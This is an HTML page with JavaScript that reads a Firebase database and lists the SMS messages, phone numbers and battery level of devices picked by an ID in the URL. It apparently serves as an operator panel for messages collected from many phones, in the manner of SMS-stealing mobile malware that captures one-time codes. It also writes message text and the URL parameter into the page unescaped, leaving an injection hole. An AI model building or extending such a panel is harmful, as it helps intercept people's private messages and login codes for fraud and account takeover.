<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Messages</title>
    <style>
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .back-btn {
            color: #94a3b8;
            text-decoration: none;
            font-size: 0.9rem;
            padding: 6px 14px;
            border: 1px solid #334155;
            border-radius: 8px;
            transition: 0.2s;
        }
        .back-btn:hover {
            border-color: #10b981;
            color: #10b981;
        }
        .device-info-box {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 14px 18px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .device-info-box .name {
            font-weight: 600;
            font-size: 1.1rem;
        }
        .device-info-box .id {
            font-size: 0.75rem;
            color: #64748b;
            font-family: monospace;
        }
        .device-info-box .stats {
            font-size: 0.8rem;
            color: #94a3b8;
        }
        .sms-card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            animation: fadeIn 0.2s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .meta {
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
            color: #10b981;
            margin-bottom: 8px;
            font-weight: bold;
        }
        .time {
            color: #94a3b8;
            font-weight: normal;
        }
        .msg {
            margin: 0;
            line-height: 1.5;
            white-space: pre-wrap;
            font-size: 0.95rem;
        }
        .info {
            font-size: 0.75rem;
            color: #64748b;
            margin-top: 8px;
            border-top: 1px dashed #334155;
            padding-top: 5px;
        }
        .loading {
            color: #94a3b8;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #334155;
            border-top: 2px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-badge {
            font-size: 0.75rem;
            padding: 4px 10px;
            border-radius: 20px;
            background: #1e293b;
            color: #94a3b8;
            border: 1px solid #334155;
        }
        .status-badge.live {
            color: #10b981;
            border-color: #10b981;
        }
        .error {
            color: #ef4444;
            padding: 20px;
            text-align: center;
        }
        .no-msg {
            color: #64748b;
            text-align: center;
            padding: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <a href="devices.html" class="back-btn">← Devices</a>
                <span style="margin-left: 12px;">📨 Device Messages</span>
            </div>
            <span id="counter" class="status-badge">Loading...</span>
        </div>

        <div id="deviceInfo" class="device-info-box">
            <div>
                <div class="name" id="deviceName">Loading...</div>
                <div class="id" id="deviceId">ID: ...</div>
            </div>
            <div class="stats" id="deviceStats">
                <span id="msgCount">0 messages</span>
            </div>
        </div>

        <div id="sms-container">
            <div class="loading">
                <span class="spinner"></span>
                Loading messages...
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // Get device ID from URL
        const params = new URLSearchParams(window.location.search);
        const deviceId = params.get('device');

        const container = document.getElementById('sms-container');
        const counter = document.getElementById('counter');
        const deviceNameEl = document.getElementById('deviceName');
        const deviceIdEl = document.getElementById('deviceId');
        const msgCountEl = document.getElementById('msgCount');

        if (!deviceId) {
            container.innerHTML = '<div class="error">❌ No device specified</div>';
            counter.textContent = 'Error';
            return;
        }

        // Initialize Firebase
        const app = initializeApp({
            databaseURL: "https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app"
        });
        const db = getDatabase(app);
        const smsRef = ref(db, 'common/smsData');

        // ============================================
        // Load device info using Firebase (no CORS)
        // ============================================
        onValue(ref(db, `users/${deviceId}`), (snapshot) => {
            const data = snapshot.val();
            
            if (data) {
                deviceNameEl.textContent = data.device_name || 'Unknown Device';
                deviceIdEl.textContent = `ID: ${deviceId}`;
                
                const sim1 = data.Sim1 || 'No SIM';
                const sim2 = data.Sim2 || 'No SIM';
                let displayNumber = 'No Number';
                
                if (sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' && sim1 !== 'No SIM') {
                    displayNumber = sim1;
                } else if (sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' && sim2 !== 'No SIM') {
                    displayNumber = sim2;
                }
                
                const statsDiv = document.getElementById('deviceStats');
                statsDiv.innerHTML = `📞 ${displayNumber} · 🔋 ${data.charge || 0}% · 📱 ${data.device_name || 'Unknown'}`;
            } else {
                deviceNameEl.textContent = 'Device Not Found';
                deviceIdEl.textContent = `ID: ${deviceId}`;
            }
        }, (error) => {
            console.warn('Could not load device info:', error);
            deviceNameEl.textContent = 'Device';
            deviceIdEl.textContent = `ID: ${deviceId}`;
        });

        // ============================================
        // Listen for SMS messages - filter by deviceId
        // ============================================
        console.log(`📡 Listening for messages from device: ${deviceId}`);

        onValue(smsRef, (snapshot) => {
            const data = snapshot.val();
            
            if (!data) {
                container.innerHTML = '<div class="no-msg">📭 No messages found</div>';
                counter.textContent = '0 messages';
                msgCountEl.textContent = '0 messages';
                return;
            }

            // Convert to array and filter by deviceId
            const allMessages = Object.values(data);
            const deviceMessages = allMessages
                .filter(sms => sms.deviceId === deviceId)
                .sort((a, b) => {
                    if (a.time > b.time) return -1;
                    if (a.time < b.time) return 1;
                    return 0;
                });

            console.log(`📨 Found ${deviceMessages.length} messages for device ${deviceId}`);

            msgCountEl.textContent = `${deviceMessages.length} messages`;
            counter.textContent = `${deviceMessages.length} messages`;
            container.innerHTML = '';

            if (deviceMessages.length === 0) {
                container.innerHTML = `
                    <div class="no-msg">
                        📭 No messages for this device<br>
                        <small style="color:#475569;font-size:0.75rem;">Device ID: ${deviceId}</small>
                    </div>
                `;
                return;
            }

            const fragment = document.createDocumentFragment();
            for (const sms of deviceMessages) {
                const card = document.createElement('div');
                card.className = 'sms-card';
                card.innerHTML = `
                    <div class="meta">
                        <span>📨 ${sms.sender || 'Unknown'}</span>
                        <span class="time">🕐 ${sms.time || 'N/A'}</span>
                    </div>
                    <p class="msg">${sms.message || ''}</p>
                    ${sms.info ? `<div class="info">⚙️ ${sms.info}</div>` : ''}
                `;
                fragment.appendChild(card);
            }
            container.appendChild(fragment);

            // Update status
            counter.className = 'status-badge live';

        }, (error) => {
            console.error('❌ Firebase error:', error);
            container.innerHTML = `<div class="error">❌ ${error.message}</div>`;
            counter.textContent = 'Error';
        });

        console.log('✅ Device SMS page loaded for:', deviceId);
    </script>
</body>
</html>
